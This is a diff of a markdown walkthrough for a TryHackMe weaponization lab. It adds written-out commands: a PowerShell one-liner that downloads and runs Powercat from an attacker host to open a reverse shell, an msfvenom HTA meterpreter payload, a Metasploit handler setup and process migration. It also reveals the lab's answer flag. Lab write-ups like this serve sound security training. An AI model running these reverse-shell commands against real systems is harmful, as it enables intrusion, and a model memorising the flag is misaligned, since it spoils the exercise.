@@ -105,15 +105,31 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
 
 1. Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 
 
+   First thing to do is to download the Powercat tool from Github.
+   
+   ```cmd
+   git clone https://github.com/besimorhino/powercat.git
+   ```
+   
    ![Git Clone](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Git_Clone.png)
    
-   ![Powercat Reverse](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Powercat_Reverse.png)
+   Next we set up a server in the Powercat folder and a listener on the specified port.
+   
+   ```cmd
+   cd Weaponization
    python3 -m http.server 8080 
+   
    sudo nc -nlvp 1337
-
-    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.18.78.136:8080/powercat.ps1');powercat -c 10.18.78.136 -p 1337 -e cmd"
-
-
+   ```
+   
+   Then we can download and execute Powercat from our target machine using PowerShell.
+   
+   ```cmd
+   powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.18.78.136:8080/powercat.ps1');powercat -c 10.18.78.136 -p 1337 -e cmd"
+   ```
+   
+   ![Powercat Reverse](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Powercat_Reverse.png)
+   
    ><details><summary>Click for answer</summary>No Answer Needed</details>
 
 ### Delivery Techniques
@@ -126,24 +142,50 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
 
 ### Practice Arena 
 
-
+In this task we will use what we have learned and try to gain access to the target machine with one (or more) of the methods.
 
 1. What is the flag? Hint: Check the user desktop folder for the flag! 
 
+   For this task I decided to use the HTML Application method. First step is to create a payload using msfvenom.
+   
+   ```cmd
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f hta-psh -o letmein.hta
-python3 -m http.server 8080
-use exploit/multi/handler
-set LHOST 10.18.78.136
-set LPORT 1337
-set payload windows/meterpreter/reverse_tcp
+   ```
+   
    ![Payload Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Payload_Creation.png)
+   
+   Then we need to setup a listener, which we can do with MetaSploit. Don't forget to set the required options.
+   
+   ```cmd
+   use exploit/multi/handler
+   
+   set LHOST 10.18.78.136
+   set LPORT 1337
+   set payload windows/meterpreter/reverse_tcp
+   ```
    
    ![Metasploit Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Metasploit_Handler.png)
    
+   Lastly, we need to setup a server in the same folder as the payload.
+   
+   ```cmd
+   python3 -m http.server 8080
+   ```
+   
+   Now we can navigate to the web application and supply the url provided by the MetaSploit handler.
+   
    ![Web Application](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Web_Application.png)
+   
+   We can see we successfully captured the reverse connection in MetaSploit. Although maybe not necessary when using this method, I also wanted to migrate our process to another. For this we can use the following command in MetaSploit:
+   
+   ```cmd
+   run post/windows/manage/migrate
+   ```
    
    ![Migrate Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Migrate_Check.png)
    
+   Finally, we can look for the flag on the system.
+   
    ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Flag.png)
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>THM{b4dbc2f16afdfe9579030a929b799719}</details>
